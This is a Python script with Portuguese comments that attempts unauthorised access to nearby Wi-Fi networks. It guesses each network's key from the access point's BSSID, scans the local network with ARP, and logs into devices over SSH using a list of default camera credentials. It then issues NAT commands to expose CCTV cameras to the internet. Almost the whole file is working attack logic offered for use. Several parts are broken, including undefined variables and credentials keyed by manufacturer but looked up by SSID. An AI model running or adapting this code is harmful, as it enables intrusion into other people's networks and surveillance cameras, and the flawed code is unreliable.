import pywifi
from scapy.all import ARP, Ether, srp
import paramiko
import socket
import subprocess
import nmap
import os
import sys

# Função para obter o endereço IP do roteador padrão
def get_router_ip():
    process = subprocess.Popen(['ip', 'route', 'show', 'default'], stdout=subprocess.PIPE)
    output, _ = process.communicate()
    output = output.decode()
    router_ip = output.split(' ')[2]
    return router_ip

# Função para obter o nome de usuário do roteador (assumindo que seja o mesmo que o nome de usuário do sistema)
def get_router_username():
    return os.getlogin()

# Função para obter a senha do roteador (assumindo que seja a mesma senha do sistema)
def get_router_password():
    return ''

# Função para obter o endereço IP interno
def get_internal_ip():
    hostname = socket.gethostname()
    internal_ip = socket.gethostbyname(hostname)
    return internal_ip

# Função para obter a porta interna disponível
def get_internal_port():
    process = subprocess.Popen(['netstat', '-an', '-p', 'tcp'], stdout=subprocess.PIPE)
    output, _ = process.communicate()

    ports = set(range(8080, 9090))  # Intervalo de portas a serem verificadas

    for line in output.decode().split('\n'):
        parts = line.split()
        if len(parts) == 4 and parts[3] == 'LISTEN':
            _, port = parts[3].rsplit(':', 1)
            ports.discard(int(port))

    internal_port = min(ports)
    return internal_port

# Função para obter a porta da interface externa (mesma porta interna)
def get_external_interface_port():
    return get_internal_port()

# Função para obter os dispositivos conectados na rede local
def obter_dispositivos_conectados():
    arp = ARP(pdst="192.168.0.1/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pacote = ether/arp
    resultado = srp(pacote, timeout=3, verbose=0)[0]

    dispositivos = []
    for sent, received in resultado:
        dispositivos.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return dispositivos

# Função para calcular a senha da rede Wi-Fi com base no BSSID
def calcular_senha(bssid):
    bssid = bssid.replace(":", "")
    bssid = bssid[2:]
    return bssid

# Função para testar as senhas de redes Wi-Fi
def testar_senhas(networks):
    for network in networks:
        senha_wifi = calcular_senha(network.bssid)

        perfil = pywifi.Profile()
        perfil.ssid = network.ssid
        perfil.auth = pywifi.const.AUTH_ALG_OPEN
        perfil.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        perfil.cipher = pywifi.const.CIPHER_TYPE_CCMP
        perfil.key = senha_wifi

        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(perfil)
        iface.connect(temp_profile)

        print(f"Conectado à rede Wi-Fi: {network.ssid} - BSSID: {network.bssid} - Senha: {senha_wifi}")

        while iface.status() != pywifi.const.IFACE_CONNECTED:
            pass

        print("Conexão Wi-Fi estabelecida!")

        dispositivos_conectados = obter_dispositivos_conectados()

        print("\nDispositivos conectados na rede:")
        for dispositivo in dispositivos_conectados:
            print(f"IP: {dispositivo['IP']} - MAC: {dispositivo['MAC']}")
        print("-------------------------------------------")

        if network.ssid in credentials:
            cam_user = credentials[network.ssid]["user"]
            cam_password = credentials[network.ssid]["password"]

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ssh.connect(dispositivos_conectados[0]['IP'], username=cam_user, password=cam_password)

                command = f'ip nat inside source static tcp {internal_ip} {internal_port} interface {external_interface_port}'
                ssh.exec_command(command)

                ssh.exec_command('write memory')

                print("CFTV configurado com sucesso para acesso pela internet.")
            except paramiko.AuthenticationException:
                print("Falha ao fazer login no host da câmera. Autenticação falhou.")
            except paramiko.SSHException:
                print("Falha ao estabelecer conexão SSH com o host da câmera.")
            finally:
                ssh.close()
        else:
            print("Nenhuma credencial disponível para o fabricante do dispositivo.")

# Função para verificar se as dependências estão instaladas e instalar, se necessário
def verificar_dependencias():
    try:
        import pywifi
        import scapy
        import paramiko
        import nmap
    except ImportError:
        print("Instale as dependências necessárias antes de executar o script.")

# Function to check credentials for a specific manufacturer
def check_credentials(manufacturer, user, password):
    with open('camlist.txt', 'r') as file:
        for line in file:
            m, u, p = line.strip().split(',')
            if m == manufacturer and u == user and p == password:
                return True
    return False

# Read the camlist.txt file
credentials = {}
with open('camlist.txt', 'r') as file:
    for line in file:
        # Split the line into manufacturer, user, and password
        manufacturer, user, password = line.strip().split(',')
        credentials[manufacturer] = {"user": user, "password": password}

# Inicializa o objeto Wifi
wifi = pywifi.PyWiFi()

# Obtém a primeira interface Wi-Fi disponível
iface = wifi.interfaces()[0]

# Ativa a interface
iface.enable()

# Obtém a lista de redes Wi-Fi disponíveis
networks = []

# Loop para conectar-se a todas as redes disponíveis
while True:
    # Obtém as redes Wi-Fi disponíveis
    scan_results = iface.scan_results()

    # Itera sobre as redes disponíveis
    for network in scan_results:
        # Verifica se a rede já foi adicionada à lista
        if network not in networks:
            # Adiciona a rede à lista de redes conectadas
            networks.append(network)

    # Testa as senhas para as redes Wi-Fi
    testar_senhas(networks)
